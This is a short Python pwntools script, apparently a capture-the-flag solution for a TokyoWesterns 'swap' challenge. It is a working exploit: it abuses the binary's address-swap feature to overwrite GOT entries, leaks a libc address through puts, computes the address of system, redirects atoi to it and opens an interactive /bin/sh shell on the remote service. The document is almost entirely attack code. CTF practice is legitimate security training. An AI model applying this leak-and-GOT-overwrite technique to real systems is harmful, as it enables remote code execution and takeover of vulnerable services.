#usr/bin/python

from pwn import *

r = remote('pwn1.chal.ctf.westerns.tokyo',19937)
#r = process('./swap-b878cc5ecf612cee902acdc91054486bb4cb3bb337a0cfbaf903ba8d35cfcd17')
print util.proc.pidof(r)

memcpy_got = 0x601040
read_got = 0x601028
atoi_got = 0x601050
puts_got = 0x601018
system_offset = 0x45390

def set(addr1,addr2):
	r.recvuntil('Your choice:')
	r.send('1')
	r.recvuntil('addr')
	r.sendline(addr1)
	r.recvuntil('addr')
	r.sendline(addr2)

def swap():
	r.recvuntil('Your choice:')
	r.send('2')

set(str(atoi_got),str(puts_got))
swap()
r.send('1')
junk = r.recvline()
leak = u64(r.recvn(6)[-5:].ljust(8,'\x00'))*0x100
log.info('leak is:%s' % hex(leak))
libc_base = leak - 0x3c5600
log.info('libc base is:%s' % hex(libc_base))
system_addr = libc_base + system_offset
log.info('system address is:%s' % hex(system_addr))

r.send('a\x00')

set(str(memcpy_got),str(read_got))
swap()
set(str(0),str(atoi_got))
swap()
r.sendline(p64(system_addr))
r.sendline('/bin/sh\x00')

r.interactive()